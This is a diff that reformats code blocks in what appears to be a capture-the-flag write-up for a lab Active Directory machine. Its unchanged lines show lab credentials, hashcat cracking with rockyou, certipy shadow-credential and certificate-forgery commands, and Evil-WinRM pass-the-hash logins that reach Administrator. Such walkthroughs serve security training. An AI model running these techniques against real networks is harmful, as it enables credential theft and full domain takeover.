@@ -27,7 +27,7 @@ Initial Access
 Provided Credentials
 The engagement starts with low-privileged access:
 
-```shell
+```Shell
 User: j.fleischman
 Password: J0elTHEM4n1990!
 ```
@@ -82,7 +82,7 @@ The hash was cracked using rockyou.txt:
 ```Shell
 hashcat -m 5600 p_agila.hash /usr/share/wordlists/rockyou.txt
 ```
-```shell
+```Shell
 Credentials Found: p.agila : prometheusx-303
 ```
 ## Active Directory Enumeration
@@ -125,6 +125,7 @@ certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' 
 ## Foothold (WinRM)
 Using the NT hash for winrm_svc, I logged in via Evil-WinRM to collect the user flag:
 
+
 ```Shell
 evil-winrm -u winrm_svc -H <NT_HASH> -i 10.129.31.61
 ```
@@ -138,7 +139,8 @@ I abused the ca_svc account (which had write permissions on the CA) to forge a c
 ```Shell
 # Request certificate as Administrator
 certipy-ad req -u ca_svc -hashes <HASH> -dc-ip 10.129.31.61 -ca fluffy-DC01-CA -template User
-
+```
+```Shell
 # Authenticate with forged PFX
 certipy-ad auth -pfx administrator.pfx -domain fluffy.htb -dc-ip 10.129.31.61
 ```
@@ -150,7 +152,7 @@ The previous step returned the Administrator's NT hash. I used it for a final Wi
 evil-winrm -u Administrator -H <ADMIN_HASH> -i dc01.fluffy.htb
 ```
 
-```shell
+```Shell
 Root Flag: C:\Users\Administrator\Desktop\root.txt
 ```
 
